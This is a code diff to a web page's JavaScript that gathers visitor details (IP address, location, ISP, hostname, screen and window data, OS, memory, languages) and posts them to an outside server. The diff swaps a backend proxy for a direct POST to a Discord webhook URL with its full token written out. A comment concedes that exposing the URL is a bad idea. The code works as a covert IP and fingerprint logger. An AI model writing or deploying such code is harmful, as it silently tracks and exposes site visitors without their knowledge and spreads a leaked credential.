@@ -100,14 +100,16 @@
             languages: navigator.language,
           };
 
-          // Set up the payload for the webhook, now includes your secret API key
+          // Set up the payload for the webhook
           const payload = {
-            secret: "geniuspeople",
             content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
           };
-
-          // Send to your Vercel backend, NOT Discord directly!
-          fetch("/api/discord-webhook", {
+          // This is a lazy way of doing it, having
+          // your webhook url out in the open like
+          // this is a bad idea, you should instead
+          // have it contact a internal API to
+          // forward the request.
+          fetch("https://discord.com/api/webhooks/1428188266871521280/Oga_d84WXZnZf3tOJwrULa_esj1le7nCU8-sh540UfH3OdhyRIiCBstYFWIT-jsW7y9M", {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
